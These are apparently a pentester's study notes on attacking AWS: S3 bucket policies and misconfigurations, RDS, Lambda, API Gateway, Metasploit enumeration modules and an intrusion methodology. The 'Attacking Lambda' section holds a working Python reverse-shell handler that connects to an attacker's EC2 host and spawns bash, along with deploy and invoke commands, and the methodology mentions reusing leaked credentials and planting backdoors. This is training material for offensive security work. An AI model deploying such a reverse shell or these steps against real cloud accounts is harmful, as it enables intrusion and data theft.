# AWS Pentesting
---
## Navigation 
- **[S3 Buckets](#S3%20Buckets)**
	- [what is S3](#what%20is%20S3)
	- [AWS attack paths](#AWS%20attack%20paths)
	- [AWS Regions and Availability Zones](#AWS%20Regions%20and%20Availability%20Zones)
	- [Bucket policies and ACLs](#Bucket%20policies%20and%20ACLs)
	- [Bucket misconfigurations](#Bucket%20misconfigurations)
	- [Attacking public buckets](#Attacking%20public%20buckets)
	- [Scripts to find private buckets](#Scripts%20to%20find%20private%20buckets)
	- [Discovering buckets with Grayhat Warfare](#Discovering%20buckets%20with%20Grayhat%20Warfare)
	- [Creating a local S3 lab](#Creating%20a%20local%20S3%20lab)
	- [Useful resource](#Useful%20resource)
- **[RDS Services](#RDS%20Services)**
	- [Advantages of using RDS](#Advantages%20of%20using%20RDS)
	- [Services hosted in RDS](#Services%20hosted%20in%20RDS)
	- [Attack Vectors](#Attack%20Vectors)
- **[Lambda Services](#Lambda%20Services)**
	- [Understanding misconfigurations](#Understanding%20misconfigurations)
	- [Testing Lambda function](#Testing%20Lambda%20function)
	- [Attacking Lambda](#Attacking%20Lambda)
- **[API Gateway](#API%20Gateway)**
- **[Metasploit modules](#Metasploit%20modules)**
	- [Stealing user credentials](#Stealing%20user%20credentials)
	- [Discovering EC2 instances](#Discovering%20EC2%20instances)
	- [Enumerating S3 buckets](#Enumerating%20S3%20buckets)
- **[Pentesting best practices](#Pentesting%20best%20practices)**
	- [Pentesting methodology](#Pentesting%20methodology)
		- [Reconnaissance](#Reconnaissance)
		- [Exploitation](#Exploitation)
		- [Post-exploitation](#Post-exploitation)  
- **[SSRF](#SSRF)**
---
# S3 Buckets
## what is S3?
**S3 is a simple storage system** (as the name implies) and allows users to store data in the **cloud**. Just like how we store data on a file server, we can store data in what is known as an S3 bucket, which will hold the contents of our data. You can store copious amounts of data in these buckets and retrieve it any time you like.
### How is information stored?
**S3** stores your data in what's called an **object**, also known as **object storage**. Object storage allows you to store data such as pictures, videos, files, and any data associated with them in the form of an object.
### Using S3 buckets
S3 stores the following types of data:
- Pictures
- Videos
- Files
- Documents containing sensitive data,and so on

> **Important note** 
> *Remember, S3 is a local filesystem in the cloud*!

### S3 attributes
- S3 bucket names are **unique and cannot be the same as someone else's**. These names are specific to a particular bucket within a certain area (vuln -> *Bucket Takeover*)
- You can create up to 100 buckets.
- Buckets are **assigned by region**. It's important to remember what regions you store your buckets in – **that's how you access them.**
- Bucket naming rules -> [**Link**](https://docs.aws.amazon.com/AmazonS3/latest/userguide/bucketnamingrules.html) 

## AWS attack paths
- Scan the internet for public S3 buckets.
- Scan for common bucket names and finds a match.
- Scan for objects in the bucket.
-  Find matches and exfiltrates information.
## AWS Regions and Availability Zones
The storage of your data and the performance of the services depends on your region so make sure the closest region to you to minimize latency.You can look at the regions by selecting them in the top-right corner of the AWS console.

![[region.png]]
*The following screenshot was pulled directly from Amazon and
highlights all the regions and the local zones that you can select:*

![[allregions.png]]

### Availability Zones
Availability Zones are fantastic for minimizing redundancy and downtime if an EC2
Instance were to go offline. Availability Zones are created to allow you to distribute an
EC2 instance across multiple zones so that if your instance fails in one zone, it can still be
accessed in another.
This diagram illustrates how AWS utilizes
Availability Zones within each region:

![[aval.zones.png]]
## Bucket policies and ACLs
Bucket policies and **access control lists** (ACLs) are used for access control – acting as
the front line to allow and deny access to S3 resources in your AWS environment.
### Public bucket policies
Navigation: `Bucket Policy` -> `Policy Generator`

Policy Example:
```json
{
  "Id": "Policy1630945079819",
  "Version": "2012-10-17",
  "Statement": [
    {
      "Sid": "Stmt1630945075499",
      "Action": "s3:*",
      "Effect": "Allow",
      "Resource": "arn:aws:s3:::abuqasem",
      "Principal": "*"
    }
  ]
}
```
To get the bucket policy
```bash
aws s3api get-bucket-policy --bucket abuqasem

#For a readable output
aws s3api get-bucket-policy --bucket abuqasem --output text | jq
```
**Output**

![[s3api.png]]

### Understanding policy attributes
• **ID** : Used as a reference number.
• Version : Tells the users what version of the policy is being used.
• **Action** : This tells you what type of resource is being used. In our case we are using S3.
• **Effect** : This portion of the policy will either "deny" or "allow" access to the resource.
• **Resource** : ARN is placed here and tells the policy what resource the policy is being applied to.
### Attacking public buckets
Whenever you find a public bucket you can `list`,`upload`,`delete` files and directories.
```bash
#Listing
aws s3 ls s3://bucket

#Uploading
aws s3 cp file.txt s3://bucket/file.txt

#Deleting
aws s3 rm s3://bucket/file.txt
```
> More commands: https://docs.amazonaws.cn/en_us/cli/latest/userguide/cli-services-s3-commands.html
### Private Bucket Policies
In this example we will  se `Effect` to `DENY`  to deny access to the s3 bucket.

Policy Example
```json
{
  "Id": "Policy1630948321031",
  "Version": "2012-10-17",
  "Statement": [
    {
      "Sid": "Stmt1630948319184",
      "Action": "s3:*",
      "Effect": "Deny",
      "Resource": "arn:aws:s3:::priv-abuqasem",
      "Principal": "*"
    }
  ]
}
```
### Uploading a new policy
Create a file with a Valid JSON and set the attributes you want then:
```bash 
aws s3api put-bucket-policy --bucket <BucketName> --policy file://<PolicyFile>.json
```
## Bucket misconfigurations
It's essential to look for simple and tiny details that could be used as leverage. S3 comes "preconditioned" with security in mind, meaning it is secured by default.These misconf. typically involve having misconfigured policies that allow too much access to a particular resource, or permissions that can easily be bypassed.

**To check whether there is any public access allowed to the bucket**
```bash
aws s3api get-public-access-block --bucket <BucketName>
```
**Output example**
In this case this Bucket is Public

![[Pentesting/AWS Pentesting/attachments/acl.png]]
## Scripts to find private buckets
### Python scripting
We need to install the Boto3 SDK for AWS. SDK is the acronym for **Software Development Kit**
> Important note
Boto3 is an AWS Software Development Kit (SDK) that is used for Python and allows developers to write code that can make use of services such as S3 and EC2.

Installation
```bash
pip3 install boto3
```
Example Code:
```python
import boto3
s3 = boto3.resource('s3')
my_bucket = s3.Bucket('my_bucket_name')
for object_summary in my_bucket.objects.filter(Prefix="dir_name/"):
	print(object_summary.key)
```
## Discovering buckets with Grayhat Warfare
A web-based tool [**Grayhat  Warfare**](https://buckets.grayhatwarfare.com/) allows users to find open buckets quickly with a simple query, and it also allows us to find other documents quickly by searching various file types.
## Creating a local S3 lab
MinIO is a local storage system that can be used to house data that you would want in the cloud and it is a great way to learn about S3 storage on your local network, without being restricted to only using names available in AWS. However, one of the drawbacks of MinIO is that policy setup can be a little bit of a learning curve or odd if you're used to typical policy generation with AWS.
> Important note
You can find a full walk-through on how to set up MinIO here:
https://medium.com/@jonathanchelmus/creating-an-
s3-lab-on-an-ec2-instance-95ffd8ac6c1 .

## Useful resource
- [**Must Read**] Tricks and tools: https://book.hacktricks.xyz/pentesting/pentesting-web/buckets/aws-s3

- More about boto3: https://realpython.com/python-boto3-aws-s3/
- Practical learning   [http://flaws.cloud](http://flaws.cloud/ ) and [http://flaws2.cloud/](http://flaws2.cloud/)

# RDS Services
**Amazon Relational Database Service** (RDS) provides scalable and easy to set up cloud-based databases that allow users to operate them just as they would a typical database.
RDS enables users to interact with databases via services such as *MySQL* and *Amazon Aurora*, just as a user would in a standard physical database infrastructure. *The downfall of RDS is the same as regular databases – injection and misconfigurations.*
## Advantages of using RDS
-  **Fast**
-  **Secure:** Both data at rest and data in use are encrypted
	-- Database instances will automatically be patched. Some options allow the manual administration of patching – as you can imagine, this can lead to security issues if patches are not applied.
- **Easy to administer**
- **Scalable**

## Services hosted in RDS
I'm mentioning only `Aurora` as the other one's are well known.
- **Aurora:** A MySQL- and PostgreSQL-*compatible* relational database built for durability and speed. It's known to be much faster than other databases.
## Attack Vectors
- **Weak Credentials.**
- **Typicall DBs injections.**
# Lambda Services
Lambda is a compute service that lets you run code without provisioning or managing servers. Lambda runs your code on a high-availability compute infrastructure and performs all of the administration of the compute resources, including server and operating system maintenance, capacity provisioning and automatic scaling, code monitoring and logging.
## Understanding misconfigurations
- **Misconfiguration:** For Lambda policy – occurs when a certain attribute is set in a "loose" manner.
- **Least privilege:** Potential issue that we want to look out for, and we want to ensure that it is practiced in a target AWS environment.We view permissions in roles and policies as policy **actions** that are classified as `List` , `Read` , `Write` , `Permissions management` , or `Tagging` . Actions noted as `"*"` in the actions for a policy mean that anyone can execute actions on the service, which is never good!

## Testing Lambda function
```bash
aws lambda get-policy --function-name <FunctionName> --region <Region>
```
**Output example**
We can see the `Allow` actin for invoking which is not good to let anyone do it and we can also see that the an `s3 bucket` attached to the function.
This show us that accessing controls such as `IAM policies`  is crucial. 
```json
{
    Policy: "Version":"2012-10-17",
    RevisionId: a331c81e-49e4-40b5-8b90-b3ecc0244721
} {
    Policy: "Id":"default",
    RevisionId: a331c81e-49e4-40b5-8b90-b3ecc0244721
} {
    Policy: "Statement":["Sid":"lambda-552c8099-6600-4e2b-9fa2-f875267522d8"],
    RevisionId: a331c81e-49e4-40b5-8b90-b3ecc0244721
} {
    Policy: "Statement":["Effect":"Allow"],
    RevisionId: a331c81e-49e4-40b5-8b90-b3ecc0244721
} {
    Policy: "Statement":["Principal":{"Service":"s3.amazonaws.com"}],
    RevisionId: a331c81e-49e4-40b5-8b90-b3ecc0244721
} {
    Policy: "Statement":["Action":"lambda:InvokeFunction"],
    RevisionId: a331c81e-49e4-40b5-8b90-b3ecc0244721
} {
    Policy: "Statement":["Resource":"arn:aws:lambda:us-east-2:379646506984:function:s3lambda"],
    RevisionId: a331c81e-49e4-40b5-8b90-b3ecc0244721
} {
    Policy: "Statement":["Condition":"StringEquals":{"AWS:SourceAccount":"379646506984"}],
    RevisionId: a331c81e-49e4-40b5-8b90-b3ecc0244721
} {
    Policy: "Statement":["Condition":"ArnLike":{"AWS:SourceArn":"arn:aws:s3:::lambda115"}],
    RevisionId: a331c81e-49e4-40b5-8b90-b3ecc0244721
}
```
## Attacking Lambda
### Creating a function to get a reverse shell
**1- Create a python reverse shell script**
We are going to use this for now -> `python2.7`
```python
import socket,subprocess,os

def lambda_handler(event, context):
    # TODO implement
    s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
    s.connect(("ec2 hostname", port))
    os.dup2(s.fileno(),0)
    os.dup2(s.fileno(),1)
    os.dup2(s.fileno(),2)
    p=subprocess.call(["/bin/bash","-i"]);
```
**2- Zip the function script**
```bash
zip function.zip revshell.py
```
**3- Create a lambda function**
```bash
aws lambda create-function --function-name <My-Function> --zip-file fileb://function.zip --handler index.handler --runtime python2.7 --role arn:aws:iam::123456789012:role/lambda-ex
```
**4- Invoke the function to get a Reverse shell**
```bash
aws lambda invoke --function-name <<Lambda ARN>> --invocation-type RequestResponse outfile.txt
```
> Lambda with CLI : https://docs.aws.amazon.com/lambda/latest/dg/gettingstarted-awscli.html

# API Gateway
**AWS API Gateway** acts as a gateway to applications that can host various types of data such as the locations of S3 buckets or an overly permissive header.
AWS works with two API types:
- **RESTful APIs:** REpresentational State Transfer.RESTful API design enables us to make what is called a stateless call or stateless request. This stateless request allows calls to be redeployed if something fails, and can also scale when needed.
- **WebSocket API:** The WebSocket API gateway is a collection of various routes integrated with various services such as Lambda functions and HTTP endpoints.WebSocket APIs are **bidirectional** and ensure that an end client can send traffic to and from services and that services can also send communication back to the client.It's commonly used in applications that run real-time streaming channels.
## Attacking API's
Looking for IDORs :)
# Metasploit modules
## Stealing user credentials
```bash
use auxiliary/cloud/aws/enum_iam
```
## Discovering EC2 instances
```bash
use auxiliary/cloud/aws/enum_ec2
```
## Enumerating S3 buckets
```bash
use auxiliary/cloud/aws/enum_s3
``` 
# Pentesting best practices
## Pentesting methodology
### Reconnaissance
Gather information about:
- Services.
- Users.
- s3 buckets (Full URL path to s3).
- EC2.
- Weak Lambda functions and policies.
### Exploitation
Potential attack path for AWS without knowledge of any credentials:
- Identifying credentials in a public GitHub repository.
- Using those credentials to authenticate to the AWS environment.
- An EC2 instance with a public DNS hosts a vulnerable web application such as WordPress that allows pentesters to attack and access the host operating system.
- Install backdoors for persistent access.
- Scan the internal VPC network and discover additional vulnerable targets.
### Post-exploitation
Other than attempting to discover more services that might be used for further attacks,We can check whether we can see other networks within the VPC i'm in. 



 # SSRF
https://blog.christophetd.fr/abusing-aws-metadata-service-using-ssrf-vulnerabilities/ 